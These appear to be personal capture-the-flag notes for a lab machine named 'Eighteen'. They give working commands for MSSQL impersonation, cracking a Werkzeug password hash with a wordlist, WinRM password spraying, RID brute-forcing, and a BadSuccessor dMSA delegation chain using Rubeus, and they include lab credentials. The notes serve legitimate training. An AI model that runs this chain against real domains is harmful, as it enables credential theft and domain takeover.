# Eighteen: Machine Notes (Part 1)

## Initial Recon

### Nmap
- Port 80/tcp: HTTP
- Port 1433/tcp: MS-SQL
- Port 5985/tcp: WinRM
- Domain: `eighteen.htb`
- DC: `DC01`

### Initial Credentials
- User: `kevin`
- Password: `iNa2we6haRj2gaw!`

## Foothold & MSSQL

### MSSQL Access
- Login as `kevin`:
```bash
impacket-mssqlclient 'kevin:iNa2we6haRj2gaw!@10.129.31.7'
```

### MSSQL Impersonation
- Check for impersonation rights:
```sql
enum_impersonate
```
- Impersonate `appdev`:
```sql
exec_as_login appdev
```

### Data Extraction
- Found `financial_planner` database.
- Extracted admin hash from `users` table:
  - User: `admin`
  - Hash: `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133`

### Cracking Werkzeug Hashes
- Hashcat does not support this format well. Used Python:
```python
from werkzeug.security import check_password_hash
hash = "pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133"
with open("/usr/share/wordlists/rockyou.txt") as f:
    for pwd in f:
        pwd = pwd.strip()
        if check_password_hash(hash, pwd):
            print("[+] Found password:", pwd)
            break
```
- Password found: `iloveyou1`

## Lateral Movement

### Password Spray & WinRM
- Used `iloveyou1` against discovered domain users:
```bash
netexec winrm 10.129.31.7 -u users.txt -p 'iloveyou1'
```
- Success: `eighteen.htb\adam.scott:iloveyou1`

### AD Enumeration (adam.scott)
- `adam.scott` is in the `IT` group.
- `IT` group has `CreateChild` permissions on `OU=Staff,DC=eighteen,DC=htb`.

## Active Directory Exploitation

### RID Brute via MSSQL (Technical Note)
- `netexec mssql 10.129.31.7 -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth`
- Works on this machine because MSSQL is on the DC and the service account can query the local SAM (AD database).

### OU Permissions Analysis
- Staff OU ACL shows `EIGHTEEN\IT` has `CreateChild` and potentially more.
- This allows creating computer objects for further attacks like RBCD or dMSA abuse.

### Exploitation Attempts
- **Failed RBCD:** Rejections on setting `msDS-AllowedToActOnBehalfOfOtherIdentity`.
- **BadSuccessor Path:**
  - Using `BadSuccessor.ps1` and `BadSuccessor.exe` to find writeable OUs.
  - Creating dMSAs (Delegated Managed Service Accounts) and computer objects.
  - Delegating `Administrator` to a controlled dMSA.

### Rubeus Operations
- Calculating computer account hashes:
```powershell
.\Rubeus.exe hash /user:FAKEPC$ /domain:eighteen.htb /password:Passw0rd!
```
- Requesting TGTs:
```powershell
.\Rubeus.exe asktgt /user:WEB$ /aes256:[HASH] /domain:eighteen.htb
```
- Requesting TGS with dMSA:
```powershell
.\Rubeus.exe asktgs /targetuser:web_dMSA$ /service:krbtgt/eighteen.htb /dmsa /opsec /ptt
```

> [!NOTE]
> This is a complex chain involving the "BadSuccessor" vulnerability which leverages delegated write permissions on OUs to create and manipulate dMSAs.
